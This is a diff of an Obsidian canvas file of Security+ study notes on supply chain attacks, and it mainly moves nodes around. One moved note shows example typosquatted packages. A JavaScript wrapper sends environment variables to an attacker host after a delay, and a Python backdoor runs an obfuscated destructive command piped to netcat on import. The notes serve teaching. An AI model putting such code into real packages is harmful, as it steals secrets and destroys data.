@@ -1045,17 +1045,6 @@
       "y": -3990
     },
     {
-      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Supply Chain Attacks/Python3-dateutil Supply Chain Attack.md",
-      "height": 960,
-      "id": "73f140ba99a0e7db",
-      "styleAttributes": {
-      },
-      "type": "file",
-      "width": 920,
-      "x": -2800,
-      "y": -4230
-    },
-    {
       "color": "3",
       "height": 60,
       "id": "e6bb6dac7522ffa2",
@@ -1180,18 +1169,6 @@
       "y": -1220
     },
     {
-      "height": 60,
-      "id": "3fa37bdff1252aae",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### Real-World Examples",
-      "type": "text",
-      "width": 280,
-      "x": -1410,
-      "y": -2860
-    },
-    {
       "color": "3",
       "height": 60,
       "id": "5ea293d07ed60fc9",
@@ -1203,19 +1180,6 @@
       "width": 420,
       "x": -1920,
       "y": -1530
-    },
-    {
-      "color": "3",
-      "height": 60,
-      "id": "7b2cf2693e79f018",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "Package Substitution",
-      "type": "text",
-      "width": 260,
-      "x": -970,
-      "y": -2580
     },
     {
       "height": 340,
@@ -1393,17 +1357,6 @@
       "width": 700,
       "x": 3330,
       "y": -3230
-    },
-    {
-      "height": 1560,
-      "id": "f762ed6493af462d",
-      "styleAttributes": {
-      },
-      "text": "## Technical Implementation\n\nMalicious packages typically implement one of these patterns:\n\n1. **Wrapper Technique**: The malicious package imports the legitimate package and adds malicious code:\n\n```javascript\n// Malicious package \"l0dash\" mimicking \"lodash\"\nconst actualLodash = require('lodash');\nconst fs = require('fs');\nconst https = require('https');\n\n// Exfiltrate environment variables\nfunction stealEnv() {\n  const data = JSON.stringify(process.env);\n  const options = {\n    hostname: 'data-collector.attacker.com',\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': data.length\n    }\n  };\n  \n  const req = https.request(options);\n  req.write(data);\n  req.end();\n}\n\n// Execute stealthily\ntry {\n  setTimeout(stealEnv, 30000); // Delay execution to avoid detection\n} catch (e) {} // Silent error handling\n\n// Re-export all legitimate functionality\nmodule.exports = actualLodash;\n```\n\n2. **Clone and Modify**: The attacker copies the legitimate package's code and injects malicious functionality:\n\n```python\n# Malicious package \"requets\" mimicking \"requests\"\n# Import all legitimate functionality from actual \"requests\"\nfrom requests import *\n\n# Add malicious backdoor code\nimport os\nimport base64\nimport subprocess\n\ndef __backdoor():\n    try:\n        # Only executes in non-dev environments\n        if os.environ.get('ENVIRONMENT') == 'production':\n            # Decode obfuscated command\n            cmd = base64.b64decode('cm0gLXJmIC8qIHwgbmMgYXR0YWNrZXIuY29tIDg4OA==').decode()\n            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    except:\n        pass\n\n# Execute silently on import\n__backdoor()\n```",
-      "type": "text",
-      "width": 1320,
-      "x": -470,
-      "y": -4680
     },
     {
       "color": "3",
@@ -1689,9 +1642,58 @@
       "y": -8470
     },
     {
+      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Supply Chain Attacks/Python3-dateutil Supply Chain Attack.md",
+      "height": 960,
+      "id": "73f140ba99a0e7db",
+      "styleAttributes": {
+      },
+      "type": "file",
+      "width": 920,
+      "x": -2800,
+      "y": -4230
+    },
+    {
+      "height": 60,
+      "id": "3fa37bdff1252aae",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### Real-World Examples",
+      "type": "text",
+      "width": 280,
+      "x": -1410,
+      "y": -2860
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "7b2cf2693e79f018",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Package Substitution",
+      "type": "text",
+      "width": 260,
+      "x": -970,
+      "y": -2580
+    },
+    {
+      "height": 1560,
+      "id": "f762ed6493af462d",
+      "styleAttributes": {
+      },
+      "text": "## Technical Implementation\n\nMalicious packages typically implement one of these patterns:\n\n1. **Wrapper Technique**: The malicious package imports the legitimate package and adds malicious code:\n\n```javascript\n// Malicious package \"l0dash\" mimicking \"lodash\"\nconst actualLodash = require('lodash');\nconst fs = require('fs');\nconst https = require('https');\n\n// Exfiltrate environment variables\nfunction stealEnv() {\n  const data = JSON.stringify(process.env);\n  const options = {\n    hostname: 'data-collector.attacker.com',\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': data.length\n    }\n  };\n  \n  const req = https.request(options);\n  req.write(data);\n  req.end();\n}\n\n// Execute stealthily\ntry {\n  setTimeout(stealEnv, 30000); // Delay execution to avoid detection\n} catch (e) {} // Silent error handling\n\n// Re-export all legitimate functionality\nmodule.exports = actualLodash;\n```\n\n2. **Clone and Modify**: The attacker copies the legitimate package's code and injects malicious functionality:\n\n```python\n# Malicious package \"requets\" mimicking \"requests\"\n# Import all legitimate functionality from actual \"requests\"\nfrom requests import *\n\n# Add malicious backdoor code\nimport os\nimport base64\nimport subprocess\n\ndef __backdoor():\n    try:\n        # Only executes in non-dev environments\n        if os.environ.get('ENVIRONMENT') == 'production':\n            # Decode obfuscated command\n            cmd = base64.b64decode('cm0gLXJmIC8qIHwgbmMgYXR0YWNrZXIuY29tIDg4OA==').decode()\n            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    except:\n        pass\n\n# Execute silently on import\n__backdoor()\n```",
+      "type": "text",
+      "width": 1320,
+      "x": -470,
+      "y": -4680
+    },
+    {
       "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Supply Chain Attacks/Cross-env Typosquatting Campaign (2020).md",
       "height": 960,
       "id": "e78a548a9251db08",
+      "styleAttributes": {
+      },
       "type": "file",
       "width": 1050,
       "x": -1760,
